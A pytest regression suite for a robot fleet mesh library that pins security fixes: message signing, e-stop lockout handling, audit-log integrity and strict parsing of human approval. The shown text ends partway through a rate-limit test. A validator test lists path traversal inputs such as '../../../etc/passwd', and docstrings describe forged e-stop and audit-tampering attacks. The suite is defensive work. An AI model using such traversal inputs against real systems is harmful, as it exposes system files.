"""Pinned regression tests for previously-found weaknesses.

Each test pins a specific behaviour so a refactor that removes the
defence fails loudly here. The behaviours covered:

* :meth:`Mesh._put_signed` drops outgoing messages on signing failure
  when a PSK is configured (no silent unsigned fallback).
* :meth:`Mesh._dispatch` returns a generic rejection while the e-stop
  lockout is engaged — no leakage of lockout duration or active flag.
* The ``robot_mesh`` tool's interrupt gate accepts only the canonical
  affirmative responses and fails closed when interrupts are unavailable.
* ``robot_mesh`` actions ``subscribe`` and ``watch`` are audited.
* Audit-log lines on disk use ``sort_keys=True`` for byte-stable ordering.
* The bridge dedup fingerprint is the full 256-bit SHA-256 hex (not
  truncated to 64 bits).
* Provisioner refuses thing names that escape the cert directory or
  contain unsafe characters.
"""

from __future__ import annotations

from unittest.mock import MagicMock, patch

import pytest

# ─── core.py: _put_signed strict-mode drop on signing failure ────────────


def test_put_signed_drops_message_when_psk_configured(monkeypatch, tmp_path):
    """If a PSK is configured and signing raises, the message MUST NOT be
    emitted unsigned — that would silently downgrade authentication."""
    monkeypatch.setenv("STRANDS_MESH_PSK", "k")
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    from strands_robots.mesh import core as core_mod
    from strands_robots.mesh.core import Mesh

    m = Mesh(MagicMock(), peer_id="x")
    with (
        patch("strands_robots.mesh.security.sign_envelope", side_effect=RuntimeError("hmac broken")),
        patch.object(core_mod, "put") as mock_put,
    ):
        m._put_signed("strands/x/cmd", {"action": "stop"})
    mock_put.assert_not_called()  # dropped, not sent unsigned


def test_put_signed_falls_back_when_no_psk(monkeypatch, tmp_path):
    """In permissive mode (no PSK), a signing failure is still acceptable
    fallback — the wire is already in legacy unsigned shape anyway."""
    monkeypatch.delenv("STRANDS_MESH_PSK", raising=False)
    monkeypatch.delenv("STRANDS_MESH_REQUIRE_AUTH", raising=False)
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    from strands_robots.mesh import core as core_mod
    from strands_robots.mesh.core import Mesh

    m = Mesh(MagicMock(), peer_id="x")
    with (
        patch("strands_robots.mesh.security.sign_envelope", side_effect=RuntimeError("oops")),
        patch.object(core_mod, "put") as mock_put,
    ):
        m._put_signed("strands/x/cmd", {"action": "stop"})
    # Permissive mode: fallback is allowed and put IS called with raw payload.
    mock_put.assert_called_once_with("strands/x/cmd", {"action": "stop"})


# ─── core.py: lockout response is generic, no state leak ───────────────


def test_lockout_response_does_not_leak_state():
    """A remote attacker probing during lockout must not learn:
    * that the lockout is engaged (no ``lockout: True`` flag)
    * how long it's been engaged (no ``elapsed``/``since`` fields)

    The dispatcher raises :class:`LockoutError` whose ``str()`` is the
    static "command rejected" — _exec_cmd publishes that as the response
    payload. No structured fields, no timing oracle.
    """
    from strands_robots.mesh import security as sec
    from strands_robots.mesh.core import Mesh

    m = Mesh(MagicMock(), peer_id="x")
    m._estop_lockout.set()
    m._last_estop_ts = 0  # imply long lockout
    try:
        m._dispatch({"action": "execute", "instruction": "go"})
    except sec.LockoutError as exc:
        # The string is generic; nothing else leaks.
        assert str(exc) == "command rejected"
        for forbidden in ("lockout", "elapsed", "since", "ts"):
            assert forbidden not in str(exc).lower()
    else:
        raise AssertionError("LockoutError not raised")


# ─── robot_mesh.py: interrupt-based gate (replaces former confirm=bool) ──


def _ctx(response="y", *, raises=False):
    """Build a stand-in ToolContext for tests."""
    c = MagicMock(name="ToolContext")
    if raises:
        c.interrupt.side_effect = RuntimeError("interrupts unavailable")
    else:
        c.interrupt.return_value = response
    return c


@pytest.mark.parametrize(
    "negative",
    ["n", "no", "cancel", "", "  ", "abort", "stop", "later"],
    ids=["n", "no", "cancel", "empty", "whitespace", "abort", "stop", "later"],
)
def test_non_affirmative_response_declines(monkeypatch, tmp_path, negative):
    """Anything other than y/yes/approve/approved declines the action.
    Operators / scripted hosts cannot accidentally approve a fleet-wide
    physical effect with an ambiguous string."""
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    import strands_robots.tools.robot_mesh as rmt

    rmt._reset_rate_limits()
    m = MagicMock()
    m.emergency_stop.return_value = []
    fn = getattr(rmt.robot_mesh, "__wrapped__", rmt.robot_mesh)
    ctx = _ctx(response=negative)
    with patch("strands_robots.tools.robot_mesh._resolve_mesh", return_value=m):
        r = fn(action="emergency_stop", tool_context=ctx)
    assert r["status"] == "error"
    assert "declined" in r["content"][0]["text"].lower()
    m.emergency_stop.assert_not_called()


@pytest.mark.parametrize(
    "non_string",
    [True, 1, 1.0, [1], {"x": 1}, None, b"y"],
    ids=["bool_True", "int_1", "float_1.0", "list", "dict", "None", "bytes_y"],
)
def test_non_string_response_declines(monkeypatch, tmp_path, non_string):
    """An LLM cannot smuggle approval by returning a truthy non-string —
    the tool only accepts the canonical 'y'/'yes'/'approve' strings."""
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    import strands_robots.tools.robot_mesh as rmt

    rmt._reset_rate_limits()
    fn = getattr(rmt.robot_mesh, "__wrapped__", rmt.robot_mesh)
    ctx = _ctx(response=non_string)
    with patch("strands_robots.tools.robot_mesh._resolve_mesh", return_value=MagicMock()):
        r = fn(action="emergency_stop", tool_context=ctx)
    assert r["status"] == "error"
    assert "declined" in r["content"][0]["text"].lower()


@pytest.mark.parametrize(
    "affirmative",
    ["y", "Y", "yes", "YES", "Yes", " yes ", "approve", "approved", "APPROVE"],
)
def test_affirmative_response_approves(monkeypatch, tmp_path, affirmative):
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    import strands_robots.tools.robot_mesh as rmt

    rmt._reset_rate_limits()
    m = MagicMock()
    m.emergency_stop.return_value = []
    fn = getattr(rmt.robot_mesh, "__wrapped__", rmt.robot_mesh)
    ctx = _ctx(response=affirmative)
    with patch("strands_robots.tools.robot_mesh._resolve_mesh", return_value=m):
        r = fn(action="emergency_stop", tool_context=ctx)
    assert r["status"] == "success"


def test_interrupt_failure_fails_closed(monkeypatch, tmp_path):
    """If tool_context.interrupt() raises (no host to deliver, direct
    agent.tool.X call, etc.), the tool MUST refuse rather than execute
    the fleet-wide action."""
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    import strands_robots.tools.robot_mesh as rmt

    rmt._reset_rate_limits()
    m = MagicMock()
    fn = getattr(rmt.robot_mesh, "__wrapped__", rmt.robot_mesh)
    ctx = _ctx(raises=True)
    with patch("strands_robots.tools.robot_mesh._resolve_mesh", return_value=m):
        r = fn(action="emergency_stop", tool_context=ctx)
    assert r["status"] == "error"
    m.emergency_stop.assert_not_called()


# ─── robot_mesh.py: subscribe / watch are now audited ────────────────────


def test_subscribe_action_is_audited(monkeypatch, tmp_path):
    """Pre-fix: subscribe was a silent reconnaissance vector. Post-fix:
    every successful and failed call is audited."""
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    import strands_robots.tools.robot_mesh as rmt

    rmt._reset_rate_limits()
    m = MagicMock()
    m.subscribe.return_value = "presence"
    fn = getattr(rmt.robot_mesh, "__wrapped__", rmt.robot_mesh)
    with patch("strands_robots.tools.robot_mesh._resolve_mesh", return_value=m):
        fn(action="subscribe", target="strands/+/presence", tool_context=_ctx())

    from strands_robots.mesh.audit import read_audit_log

    records = read_audit_log()
    events = [r for r in records if r["payload"].get("action") == "subscribe"]
    assert events, "subscribe call must produce an audit record"
    assert events[0]["payload"]["success"] is True


def test_watch_action_is_audited(monkeypatch, tmp_path):
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    import strands_robots.tools.robot_mesh as rmt

    rmt._reset_rate_limits()
    m = MagicMock()
    m.on_stream.return_value = "stream:peer-b"
    fn = getattr(rmt.robot_mesh, "__wrapped__", rmt.robot_mesh)
    with patch("strands_robots.tools.robot_mesh._resolve_mesh", return_value=m):
        fn(action="watch", target="peer-b", tool_context=_ctx())
    from strands_robots.mesh.audit import read_audit_log

    records = read_audit_log()
    events = [r for r in records if r["payload"].get("action") == "watch"]
    assert events
    assert events[0]["payload"]["success"] is True


# ─── audit.py: sort_keys on disk ─────────────────────────────────────────


def test_audit_disk_format_canonical(monkeypatch, tmp_path):
    """The on-disk JSON line uses sort_keys=True so every operator who
    grep/diff/jq's the file sees a stable byte-for-byte format."""
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    monkeypatch.delenv("STRANDS_MESH_AUDIT_PSK", raising=False)
    from strands_robots.mesh import audit

    audit._SEQ_COUNTERS.clear()
    audit._AUDIT_STATE.seq_loaded = False
    audit.log_safety_event("estop", "x", {"z": 1, "a": 2, "m": 3})
    line = audit.audit_log_path().read_text().strip()
    # Keys in record + payload should be alphabetically sorted.
    # Quick check: 'event' should appear before 'payload', 'a' before 'm' before 'z'.
    assert line.find('"event"') < line.find('"payload"') < line.find('"peer_id"')
    pa = line.find('"a"')
    pm = line.find('"m"')
    pz = line.find('"z"')
    assert 0 < pa < pm < pz


# ─── bridge dedup: full SHA256 fingerprint ───────────────────────────────


def test_bridge_dedup_uses_full_256bit_hash():
    """Pre-fix: 16-hex (64-bit) truncation → 2^32 birthday risk.
    Post-fix: full 64-hex (256-bit) hash."""
    from strands_robots.mesh.transport.bridge_transport import _CommandDeduplicator

    d = _CommandDeduplicator(ttl_s=10)
    payload = {"sender_id": "x", "turn_id": "t1", "command": {"action": "status"}}
    ident = d._dedup_id(payload)
    assert ident is not None
    assert ident.startswith("f:")
    assert len(ident) == 2 + 64  # "f:" + sha256 hex


# ─── provision.py: thing_name validation ─────────────────────────────────


def test_provision_robot_rejects_path_traversal_thing_name():
    """thing_name with `/` or `..` must fail before any AWS call."""
    from strands_robots.mesh.iot.provision import _validate_thing_name

    bad_names = [
        "../../../etc/passwd",
        "x/y/z",
        "robot..1",
        "name with space",
        "",
        "x" * 200,  # too long
        "x\x00",  # NUL
        "../escape",
    ]
    for n in bad_names:
        with pytest.raises(ValueError):
            _validate_thing_name(n)


def test_provision_robot_accepts_valid_thing_names():
    from strands_robots.mesh.iot.provision import _validate_thing_name

    for n in ["robot-1", "so100_a1b2", "fleet-prod-42", "X" * 128]:
        _validate_thing_name(n)  # no exception


# ─── Review feedback regressions (PR #194) ──────────────────────────────


def test_multi_peer_broadcast_each_peer_accepts_independently(monkeypatch, tmp_path):
    """Reviewer finding: process-global nonce cache rejected the second
    peer's verify of a broadcast as a 'replay' even though it was the
    first arrival at THAT peer.

    Two peers in one process must each accept the same broadcast envelope
    once. The cache key is now `(scope, nonce)` so each peer has its own
    replay window.
    """
    monkeypatch.setenv("STRANDS_MESH_PSK", "k")
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    from strands_robots.mesh import security as sec

    sec.clear_replay_cache()
    env = sec.sign_envelope({"sender_id": "alice", "command": {"action": "status"}})

    # peer-a accepts.
    peer_a = sec.verify_envelope(env, scope="peer-a")
    assert peer_a["sender_id"] == "alice"

    # peer-b sees the same envelope on its broadcast subscription. Must accept.
    peer_b = sec.verify_envelope(env, scope="peer-b")
    assert peer_b["sender_id"] == "alice"

    # Same peer-a verifying the same envelope twice IS a replay.
    import pytest as _pytest

    with _pytest.raises(sec.AuthenticationError, match="replay"):
        sec.verify_envelope(env, scope="peer-a")


def test_audit_seq_per_peer_no_phantom_gaps(monkeypatch, tmp_path):
    """Reviewer finding: process-global seq counter caused
    verify_audit_integrity to report phantom gaps when several peers
    interleaved writes in the same process.

    With per-peer counters the gap-detection sees adjacent values
    within each peer's own stream and reports 'ok'.
    """
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    from strands_robots.mesh import audit

    audit._SEQ_COUNTERS.clear()
    audit._AUDIT_STATE.seq_loaded = False
    # Interleaved writes from two peers.
    for i in range(5):
        audit.log_safety_event("e", "peer-a", {"i": i})
        audit.log_safety_event("e", "peer-b", {"i": i})

    result = audit.verify_audit_integrity()
    assert result["ok"] is True, result
    assert result["sequence_gaps"] == []


def test_state_loop_publish_goes_through_signed_envelope(monkeypatch, tmp_path):
    """Reviewer finding: _state_loop and publish_step bypassed
    _put_signed and emitted raw payloads on `state` and `stream`.

    Both paths must now wrap through the envelope so strict-mode
    receivers accept them.
    """
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    from unittest.mock import MagicMock, patch

    from strands_robots.mesh import core as core_mod
    from strands_robots.mesh import security as sec
    from strands_robots.mesh.core import Mesh

    mock_robot = MagicMock()
    mock_robot.robot = None  # no inner robot — state loop will short-circuit
    m = Mesh(mock_robot, peer_id="x")

    # Force _state_loop's read_state to return a non-empty snapshot.
    with patch.object(m, "_read_state", return_value={"peer_id": "x", "t": 1.0, "x": 1}):
        with patch.object(core_mod, "put") as mock_put:
            # Manually invoke one iteration's body via _put_signed indirection.
            m._put_signed(f"strands/{m.peer_id}/state", m._read_state())
            assert mock_put.called
            (key, payload), _ = mock_put.call_args
            # In permissive mode the envelope is still emitted with v/ts/nonce
            # even without a sig.
            assert payload.get("v") == 1
            assert "nonce" in payload
            inner = sec.verify_envelope(payload, scope="test")
            sec.clear_replay_cache()
            assert inner["x"] == 1


def test_lockout_raises_lockouterror_and_audits(monkeypatch, tmp_path):
    """Reviewer finding: the lockout previously returned a dict that
    _exec_cmd then wrapped as type='response', and the rejection wasn't
    audited. Now _dispatch raises LockoutError, _exec_cmd handles it
    symmetrically with ValidationError, and the audit log records it.
    """
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    from unittest.mock import MagicMock, patch

    from strands_robots.mesh import audit
    from strands_robots.mesh import core as core_mod
    from strands_robots.mesh.core import Mesh

    audit._SEQ_COUNTERS.clear()
    audit._AUDIT_STATE.seq_loaded = False
    mock_robot = MagicMock()
    m = Mesh(mock_robot, peer_id="r1")
    m._estop_lockout.set()
    m._last_estop_ts = 0

    captured: list[tuple[str, dict]] = []
    with patch.object(core_mod, "put", side_effect=lambda k, p: captured.append((k, p))):
        m._exec_cmd({"sender_id": "alice", "turn_id": "t1", "command": {"action": "execute", "instruction": "go"}})

    # Response is type='error', not type='response'.
    from strands_robots.mesh import security as sec

    response_envelopes = [(k, p) for k, p in captured if "response" in k]
    assert len(response_envelopes) == 1
    payload = sec.verify_envelope(response_envelopes[0][1], scope="x")
    sec.clear_replay_cache()
    assert payload["type"] == "error"
    assert payload["error"] == "command rejected"

    # Audit log gained a `command_rejected_lockout` entry.
    records = audit.read_audit_log()
    assert any(r["event"] == "command_rejected_lockout" for r in records), records


def test_safety_estop_topic_engages_remote_lockout(monkeypatch, tmp_path):
    """Reviewer finding: only the issuer of emergency_stop engaged its
    own lockout; receivers stopped the current task and then accepted
    the very next command. Now both peers subscribe to
    strands/safety/estop and the handler engages the lockout fleet-wide.
    """
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    monkeypatch.setenv("STRANDS_MESH_PSK", "k")
    import json
    from unittest.mock import MagicMock

    from strands_robots.mesh import security as sec
    from strands_robots.mesh.core import Mesh

    sec.clear_replay_cache()
    receiver = Mesh(MagicMock(), peer_id="r-receiver")
    assert not receiver._estop_lockout.is_set()

    # Build an estop event the way emergency_stop would on the issuer.
    est_envelope = sec.sign_envelope(
        {"peer_id": "r-issuer", "t": 1.0, "responses_received": 0, "lockout_engaged": True}
    )
    sample = MagicMock()
    sample.payload.to_bytes.return_value = json.dumps(est_envelope).encode()

    receiver._on_safety_estop(sample)
    assert receiver._estop_lockout.is_set(), "remote estop must engage receiver's lockout"

    # And resume clears it again.
    sec.clear_replay_cache()
    res_envelope = sec.sign_envelope({"peer_id": "r-issuer", "t": 2.0, "lockout_elapsed_s": 0.5})
    sample.payload.to_bytes.return_value = json.dumps(res_envelope).encode()
    receiver._on_safety_resume(sample)
    assert not receiver._estop_lockout.is_set(), "remote resume must clear receiver's lockout"


def test_unsigned_estop_rejected_in_strict_mode(monkeypatch, tmp_path):
    """An attacker without the PSK must not be able to engage a fleet-wide
    lockout by spamming strands/safety/estop with unsigned payloads."""
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    monkeypatch.setenv("STRANDS_MESH_REQUIRE_AUTH", "true")
    from unittest.mock import MagicMock

    from strands_robots.mesh.core import Mesh

    receiver = Mesh(MagicMock(), peer_id="r-receiver")
    assert not receiver._estop_lockout.is_set()

    sample = MagicMock()
    sample.payload.to_bytes.return_value = b'{"peer_id": "attacker", "t": 0}'  # bare dict

    receiver._on_safety_estop(sample)
    assert not receiver._estop_lockout.is_set(), "unsigned estop must be ignored"


# ─── Round-2 review regressions (PR #194 — 2026-05-22) ──────────────────


def test_publish_safety_event_goes_through_signed_envelope(monkeypatch, tmp_path):
    """publish_safety_event MUST route through _put_signed so an attacker
    cannot inject unsigned fake safety events into the cloud audit table.

    Round-2 finding #1 (yinsong1986): the topic is mirrored to
    DynamoDB via the IoT bootstrap rule, and was previously emitted via
    raw transport.put().
    """
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    from unittest.mock import MagicMock

    from strands_robots.mesh.core import Mesh

    m = Mesh(MagicMock(), peer_id="r1")
    m._running = True  # publish_safety_event short-circuits when not running
    captured: list[tuple[str, dict]] = []
    m._put_signed = lambda topic, payload: captured.append((topic, payload))  # type: ignore[method-assign]

    m.publish_safety_event("estop", payload={"reason": "test"})

    assert len(captured) == 1
    topic, event = captured[0]
    assert topic == "strands/r1/safety/event"
    assert event["type"] == "estop"
    assert event["peer_id"] == "r1"


def test_sensor_publishes_go_through_signed_envelope(monkeypatch, tmp_path):
    """All seven sensor topics (pose/health/imu/odom/lidar/hand/map) must
    route through _put_signed. Round-2 finding #1.

    We don't drive the sensor loops (they're long-running threads); we
    grep the source for `transport.put(` calls inside SensorLoopsMixin to
    fail loudly if any future refactor reintroduces the unsigned path.
    """
    from pathlib import Path

    src = Path("strands_robots/mesh/sensors.py").read_text()
    # The only legitimate `put(` calls in sensors.py belong to imports
    # (the `from .transport import put` line) and the `_put_signed`
    # method itself. Anything that publishes via raw `put(f"strands/...` or
    # `transport.put(...)` is a bug.
    bad_lines = [line for line in src.splitlines() if 'put(f"strands/' in line and "_put_signed" not in line]
    assert bad_lines == [], (
        "sensors.py must not publish via raw put(); use self._put_signed() "
        "instead. Offending lines:\n  " + "\n  ".join(bad_lines)
    )


def test_permissive_mode_safety_estop_refused(monkeypatch, tmp_path):
    """In permissive mode (no PSK, no STRICT_AUTH) the receiver MUST refuse
    to engage its lockout in response to a remote safety/estop. Otherwise
    any LAN peer can DoS the fleet.

    Round-2 finding #2.
    """
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    monkeypatch.delenv("STRANDS_MESH_PSK", raising=False)
    monkeypatch.delenv("STRANDS_MESH_REQUIRE_AUTH", raising=False)
    from unittest.mock import MagicMock

    from strands_robots.mesh.core import Mesh

    receiver = Mesh(MagicMock(), peer_id="r-receiver")
    assert not receiver._estop_lockout.is_set()

    sample = MagicMock()
    sample.payload.to_bytes.return_value = b'{"peer_id": "anyone", "t": 0}'

    receiver._on_safety_estop(sample)
    assert not receiver._estop_lockout.is_set(), "permissive-mode receivers must NOT engage lockout from remote estop"


def test_permissive_mode_safety_resume_refused(monkeypatch, tmp_path):
    """In permissive mode an attacker on the LAN can publish
    strands/safety/resume to silently undo every peer's e-stop. The
    handler MUST refuse to clear the lockout.

    Round-2 finding #2 (the more dangerous half — clearing a real e-stop).
    """
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    monkeypatch.delenv("STRANDS_MESH_PSK", raising=False)
    monkeypatch.delenv("STRANDS_MESH_REQUIRE_AUTH", raising=False)
    from unittest.mock import MagicMock

    from strands_robots.mesh.core import Mesh

    receiver = Mesh(MagicMock(), peer_id="r-receiver")
    receiver._estop_lockout.set()  # simulate a real, locally-engaged e-stop
    assert receiver._estop_lockout.is_set()

    sample = MagicMock()
    sample.payload.to_bytes.return_value = b'{"peer_id": "anyone", "t": 0}'

    receiver._on_safety_resume(sample)
    assert receiver._estop_lockout.is_set(), (
        "permissive-mode receivers MUST NOT clear lockout from a remote resume "
        "— that's the LAN-attacker silent-undo path"
    )


def test_audit_seq_persists_across_process_restart(monkeypatch, tmp_path):
    """_SEQ_COUNTERS is reloaded from the sidecar file so a process restart
    does NOT reset every peer's seq back to 1. A compromised process that
    deletes records and restarts must NOT yield a clean
    verify_audit_integrity() result.

    Round-2 finding #4.
    """
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    from strands_robots.mesh import audit

    # Process 1: write three events.
    audit._SEQ_COUNTERS.clear()
    audit._AUDIT_STATE.seq_loaded = False
    for i in range(3):
        audit.log_safety_event("e", "peer-a", {"i": i})
    assert audit._SEQ_COUNTERS["peer-a"] == 3

    # Sidecar must exist and reflect the counter.
    sidecar = audit._seq_sidecar_path()
    assert sidecar.exists(), "seq sidecar must be persisted"
    import json as _json

    on_disk = _json.loads(sidecar.read_text())
    assert on_disk == {"peer-a": 3}

    # Process 2: simulate restart by clearing in-memory state.
    audit._SEQ_COUNTERS.clear()
    audit._AUDIT_STATE.seq_loaded = False

    # Next event must continue from 4, not restart at 1.
    audit.log_safety_event("e", "peer-a", {"i": "after-restart"})
    assert audit._SEQ_COUNTERS["peer-a"] == 4, "seq counter MUST resume from sidecar after restart, not reset to 1"


def test_audit_bad_signature_does_not_advance_per_peer_cursor(monkeypatch, tmp_path):
    """A tampered record's seq value MUST NOT update last_seq_by_peer in
    verify_audit_integrity. Otherwise an attacker can edit a record's
    claimed seq to mask a real gap caused by deleting subsequent records.

    Round-2 finding #7.
    """
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    monkeypatch.setenv("STRANDS_MESH_AUDIT_PSK", "test-psk")
    from strands_robots.mesh import audit

    audit._SEQ_COUNTERS.clear()
    audit._AUDIT_STATE.seq_loaded = False
    # Write three legit signed records.
    for i in range(3):
        audit.log_safety_event("e", "peer-a", {"i": i})

    # Tamper with record #2: forge its seq to 99 so the next legit record
    # at seq=3 would look like it has a huge gap if the cursor advanced.
    log_path = audit.audit_log_path()
    import json as _json

    lines = log_path.read_text().splitlines()
    rec = _json.loads(lines[1])
    rec["seq"] = 99
    # Don't re-sign; signature verification will fail and the record
    # should be flagged as bad_signature and NOT advance the cursor.
    lines[1] = _json.dumps(rec, sort_keys=True, separators=(",", ":"))
    log_path.write_text("\n".join(lines) + "\n")

    result = audit.verify_audit_integrity()
    assert result["bad_signature"] >= 1, "tampered record must be flagged"
    # Cursor must NOT have jumped to 99 — record 3 should still be
    # adjacent to record 1, so we expect a gap from (1, 3) reported.
    gaps = result["sequence_gaps"]
    if gaps:
        for prev, curr in gaps:
            assert curr <= 3, (
                f"bad_signature record advanced cursor: gap ({prev}, {curr}) "
                f"contains the forged seq=99 — cursor was poisoned"
            )


def test_verify_ca_pin_ignores_break_glass_env(monkeypatch, tmp_path):
    """verify_ca_pin (the public forensic helper) MUST always do the raw
    hash compare even when STRANDS_MESH_DISABLE_CA_PIN=true. Otherwise an
    attacker on a compromised host can defeat the very check ops use to
    detect tampering.

    Round-2 finding #6.
    """
    monkeypatch.setenv("STRANDS_MESH_DISABLE_CA_PIN", "true")
    from strands_robots.mesh.iot.provision import verify_ca_pin

    bogus_ca = tmp_path / "fake.pem"
    bogus_ca.write_bytes(b"-----BEGIN CERTIFICATE-----\nNOT A REAL CA\n-----END CERTIFICATE-----\n")

    assert verify_ca_pin(bogus_ca) is False, (
        "verify_ca_pin must NEVER honour STRANDS_MESH_DISABLE_CA_PIN — "
        "that env var is for provisioning re-encoding proxies only, "
        "not the forensic / ops verification path"
    )


def test_robot_mesh_interrupt_does_not_swallow_arbitrary_exceptions(monkeypatch, tmp_path):
    """The interrupt-unavailable fallback in robot_mesh must catch only
    RuntimeError (the no-agent-context signal). Other exceptions like
    AttributeError or TypeError are programming errors and MUST propagate
    so they are visible in tests / dev, not silently masked as
    "interrupt unavailable".

    Round-2 finding #5.
    """
    import inspect

    from strands_robots.tools import robot_mesh as rm

    src = inspect.getsource(rm.robot_mesh)
    # The narrow exception clause must be present and we MUST NOT regress
    # to bare `except Exception` in the interrupt path.
    assert "except RuntimeError" in src, "interrupt fallback must catch RuntimeError"
    # Find the interrupt try-block; the line immediately before
    # "_audit_tool_action(action, target, False, f\"interrupt unavailable" should
    # be `except RuntimeError as exc:`, not `except Exception`.
    lines = src.splitlines()
    for i, line in enumerate(lines):
        if "interrupt unavailable" in line and "_audit_tool_action" in line:
            # Walk back to find the matching except: clause
            for j in range(i, max(0, i - 10), -1):
                if "except " in lines[j]:
                    assert "except Exception" not in lines[j], (
                        f"robot_mesh interrupt fallback uses `except Exception` "
                        f"at line {j}; AGENTS.md forbids bare Exception in "
                        f"non-recovery paths. Use `except RuntimeError`."
                    )
                    break
            break


def test_psk_warned_global_is_used_by_helper(monkeypatch):
    """CodeQL #219 / #223 — the one-shot ``_PSK_WARNED`` flag was refactored
    onto a module-level state object (``_PROCESS_STATE.psk_warned``) so
    static analysers see a normal attribute read+write rather than a bare
    ``global`` declaration on a scalar (which CodeQL kept mis-classifying
    as "unused global variable" even after the helper hoist).

    Pin that:
    - the helper ``_warn_psk_unset_once`` still exists,
    - calling it sets ``_PROCESS_STATE.psk_warned``,
    - subsequent calls are idempotent.
    """
    from strands_robots.mesh import security as sec

    assert hasattr(sec, "_PROCESS_STATE"), "the refactor must expose _PROCESS_STATE"
    assert hasattr(sec, "_warn_psk_unset_once"), "the helper must still exist"

    sec._PROCESS_STATE.psk_warned = False
    sec._warn_psk_unset_once()
    assert sec._PROCESS_STATE.psk_warned is True
    # Idempotent — second call must not flip anything weird.
    sec._warn_psk_unset_once()
    assert sec._PROCESS_STATE.psk_warned is True

    # Defensive: the legacy module-level scalar must NOT exist any more —
    # if a future refactor reintroduces it, CodeQL #219 / #223 would
    # reopen.
    assert not hasattr(sec, "_PSK_WARNED"), (
        "Legacy _PSK_WARNED scalar reintroduced — CodeQL #219/#223 will reopen. Use _PROCESS_STATE.psk_warned."
    )


# ───────────────────────────────────────────────────────────────────────────
# Round 3 — additional review feedback from yinsong1986 (PR #194 round 3)
# ───────────────────────────────────────────────────────────────────────────


def test_r3_1_dispatch_error_does_not_leak_internal_detail_on_wire(monkeypatch):
    """R3-1: ``core.py`` dispatch-exception fallback must NOT leak the
    underlying ``str(exc)`` onto the response topic.

    Internal exception detail (paths, attribute names, library traces)
    is operationally useful in local logs but a defence-in-depth liability
    on the wire — it gives a remote (possibly attacker-controlled) caller
    fragments to pivot on. The structured ``ValidationError`` /
    ``LockoutError`` paths emit precise generic messages; the catch-all
    must do the same.
    """
    from unittest.mock import patch

    from strands_robots.mesh.core import Mesh

    captured: list[tuple[str, dict]] = []

    class _StubMesh(Mesh):
        def _put_signed(self, key, payload):  # type: ignore[override]
            captured.append((key, payload))

    class _Robot:
        def get_features(self):
            return {}

    m = _StubMesh.__new__(_StubMesh)
    Mesh.__init__(m, _Robot(), peer_id="me")

    with patch.object(m, "_dispatch", side_effect=RuntimeError("/secret/path/leaked.py:42")):
        m._exec_cmd({"sender_id": "alice", "turn_id": "t1", "command": {"action": "status"}})

    err_payload = next(p for k, p in captured if k == "strands/alice/response/t1")
    assert err_payload["type"] == "error"
    # Must be the static sanitised string, not the RuntimeError contents.
    assert err_payload["error"] == "dispatch error"
    assert "/secret/path" not in err_payload["error"]
    assert "leaked.py" not in err_payload["error"]


def test_r3_2_consume_peer_token_releases_registry_lock_before_consume(monkeypatch):
    """R3-2: ``consume_peer_token`` must NOT hold ``_PEER_RATE_LOCK`` while
    calling ``bucket.consume()``.

    The TokenBucket has its own internal lock, so holding the registry
    lock during consume() serialises every per-sender check across the
    whole process — defeating the point of per-bucket locks at high
    command volume across many peers. We pin the contract by source
    inspection: the consume call must live OUTSIDE the ``with
    _PEER_RATE_LOCK:`` block.
    """
    import inspect

    from strands_robots.mesh import security as sec

    src = inspect.getsource(sec.consume_peer_token)
    # Confirm there's a ``with _PEER_RATE_LOCK:`` block at all
    # (the test below pins where the consume call lives relative
    # to it).
    assert "with _PEER_RATE_LOCK:" in src
    # The bucket.consume call must come AFTER the with block — i.e. its
    # indentation must be back at the function level, not inside the with.
    lines = src.splitlines()
    in_with_block = False
    consume_line: str | None = None
    consume_indent: int | None = None
    with_indent: int | None = None
    for line in lines:
        stripped = line.lstrip()
        indent = len(line) - len(stripped)
        if stripped.startswith("with _PEER_RATE_LOCK"):
            in_with_block = True
            with_indent = indent
            continue
        if in_with_block and with_indent is not None and indent <= with_indent and stripped:
            in_with_block = False
        if "bucket.consume(" in line:
            consume_line = line
            consume_indent = indent
            # We want the LAST consume call (the actual return).
    assert consume_line is not None, "consume_peer_token must call bucket.consume"
    assert with_indent is not None
    assert consume_indent is not None
    assert consume_indent <= with_indent, (
        "bucket.consume(...) is still inside `with _PEER_RATE_LOCK:` — "
        "this serialises every per-sender check across the whole process. "
        "Move the consume call OUTSIDE the with block (TokenBucket has its "
        "own internal lock)."
    )


def test_r3_3_declined_hitl_approval_does_not_consume_rate_slot():
    """R3-3: a declined operator approval must NOT consume a slot in the
    sliding-window rate-limit history.

    Without the split between check-and-record, three nuisance LLM
    prompts an operator declines within a minute would lock the agent
    out of issuing a real ``emergency_stop`` (capped at 3/min). The
    rate limit exists to bound LLM-driven nuisance, not to inhibit a
    genuine emergency.
    """
    import strands_robots.tools.robot_mesh as rmt

    rmt._reset_rate_limits()
    # Unwrap the @tool-decorated callable (existing pattern in this file).
    fn = getattr(rmt.robot_mesh, "__wrapped__", rmt.robot_mesh)
    ctx = _ctx(response="n")  # operator declines every time

    # Decline 3 emergency_stops in a row (the cap is 3/min).
